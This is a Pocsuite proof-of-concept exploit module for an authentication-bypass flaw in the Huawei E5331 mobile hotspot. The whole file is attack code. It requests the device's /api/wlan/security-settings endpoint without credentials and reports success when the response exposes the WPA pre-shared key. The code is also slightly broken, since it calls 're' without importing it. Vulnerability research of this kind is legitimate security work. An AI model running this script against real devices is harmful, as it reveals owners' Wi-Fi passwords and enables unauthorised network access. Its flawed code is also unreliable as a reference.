#!/usr/bin/env python
# coding: utf-8
from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register


class Huawei_E5331_Unauthorized_access(POCBase):
    vulID = '61930'  # ssvid
    version = '1.0'
    author = ['anonymous']
    vulDate = '2013-12-06'
    createDate = '2015-11-13'
    updateDate = '2015-11-13'
    references = ['http://www.sebug.net/vuldb/ssvid-61930']
    name = 'Huawei E5331 API验证绕过漏洞'
    appPowerLink = 'http://www.huawei.com'
    appName = 'Huawei E355'
    appVersion = 'Software version 21.344.11.00.414'
    vulType = 'Unauthorized access'
    desc = '''
            All discovered vulnerabilities can be exploited without authentication and therefore pose a high security risk.
           '''
    samples = ['']

    def _attack(self):
        return self._verify()

    def _verify(self, verify=True):
        result = {}
        vul_url = '%s/api/wlan/security-settings' % (self.url)
        response = req.get(vul_url).content

        if re.search('<WifiWpapsk>', response) and re.search('<WifiWpaencryptionmodes>', response):
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = vul_url

        return self.parse_attack(result)

    def parse_attack(self, result):
        output = Output(self)

        if result:
            output.success(result)
        else:
            output.fail('failed')

        return output


register(Huawei_E5331_Unauthorized_access)